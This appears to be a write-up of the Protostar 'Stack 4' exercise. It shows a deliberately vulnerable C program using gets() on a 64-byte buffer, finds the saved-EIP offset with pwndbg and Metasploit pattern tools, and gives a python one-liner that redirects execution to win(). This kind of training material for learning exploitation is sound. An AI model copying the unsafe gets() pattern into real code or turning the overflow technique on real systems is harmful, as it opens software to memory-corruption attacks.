# Stack 4

## About

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

Hints
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run < input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.
			
``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
  }
  
  int main(int argc, char **argv)
  {
    char buffer[64];
	
	  gets(buffer);
	  }
	  
```
## Solution

like last time the value of `win` is needed 

```
pwndbg> print win
$1 = {void (void)} 0x80483f4 <win>
```

i then need to overwrite the `eip` value with the value of `win`. to find the `eip` value i use pattern create 

``` bash
[root:/opt/Data/4]# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 > pattern
[root:/opt/Data/4]# gdb ../bin/stack4

pwndbg> run <pattern
Starting program: /opt/Data/bin/stack4 <pattern
```

and there is a segmentation fault

```
Program received signal SIGSEGV (fault address 0x63413563)
pwndbg>
```

using that i can use pattern offset to calculate the length to the `eip`.

``` bash
[root:/opt/Data/4]# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```

so my exploit will be this 

``` bash
[root:/opt/Data/4]# echo $(python -c 'print "A"*76 + "\xf4\x83\x04\x08"') | ../bin/stack4
code flow successfully changed
[1]    13675 done                echo $(python -c 'print "A"*76 + "\xf4\x83\x04\x08"') |
       13676 segmentation fault  ../bin/stack4
```
